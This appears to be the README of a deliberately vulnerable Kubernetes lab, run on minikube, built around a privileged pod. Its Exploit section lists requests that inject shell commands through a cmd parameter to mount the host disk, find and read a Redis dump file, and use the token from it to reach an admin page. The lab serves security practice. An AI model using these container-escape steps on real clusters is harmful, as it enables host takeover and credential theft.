# Privileged Pod

1. Install and run [minikube](https://kubernetes.io/docs/setup/learning-environment/minikube/#installation).
2. `./build.sh`

## Web

Vulnerable application with RCE and privileged access.

## Redis

## Admin

## Exploit

1. http://192.168.99.100/?cmd=mkdir /tmp/host
2. http://192.168.99.100/?cmd=mount /dev/sda1 /tmp/host
3. http://192.168.99.100/?cmd=find /tmp/host -name "dump.rdb"
4. http://192.168.99.100/?cmd=cat <👆>
5. http://192.168.99.100/admin?token=<👆>
